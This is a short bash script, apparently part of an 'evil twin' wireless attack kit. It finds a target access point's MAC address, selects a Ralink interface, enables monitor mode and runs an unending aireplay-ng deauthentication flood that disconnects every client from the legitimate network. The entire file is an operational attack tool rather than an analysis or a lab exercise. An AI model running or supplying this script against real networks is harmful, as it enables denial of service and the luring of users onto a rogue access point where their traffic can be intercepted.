#!/bin/bash

sleep 5s

### USE THIS SECTION WHEN RUNNING DEAUTH SEPARATE FROM twin.sh ###

# Find the MAC of the access point
isNext="no"
mac=""

for token in $ap
do
  if [ "$isNext" == "yes" -a "$mac" == "" ]
    then
      mac=$token
      isNext="no"
  fi
  if [ "$token" == "Point:" ]
    then
      isNext="yes"
  fi
done

# Find the interface of the Ralink
ralinks=$(sudo airmon-ng | grep "Ralink")
iface=${iface:0:5}
for token in $ralinks
do
  if [ "$token" != "wlan0" -a "${token:0:4}" == "wlan" ]
    then
      iface=$token
  fi
done

### END OF SECTION ###

### USE THIS SECTION WHEN CALLING deauth.sh FROM twin.sh ###

# arg 1 is the interface used by hostapd
# arg 2 is the mac of legitimate AP

#iface=$1
#mac=$2

### END OF SECTION ###

# If another ralink interface exists, use that one
ralinks=$(sudo airmon-ng | grep "Ralink")

for token in $ralinks
do
  start=""
  if [ ${#token} -gt 4 ]
    then
      start=${token:0:4}
  fi
  if [ "$start" == "wlan" -a "$token" != "$1" ]
    then
      iface=$token
  fi
done

# Start airmon-ng
sudo airmon-ng start $iface
sudo aireplay-ng --deauth 0 -a $mac --ignore-negative-one mon0
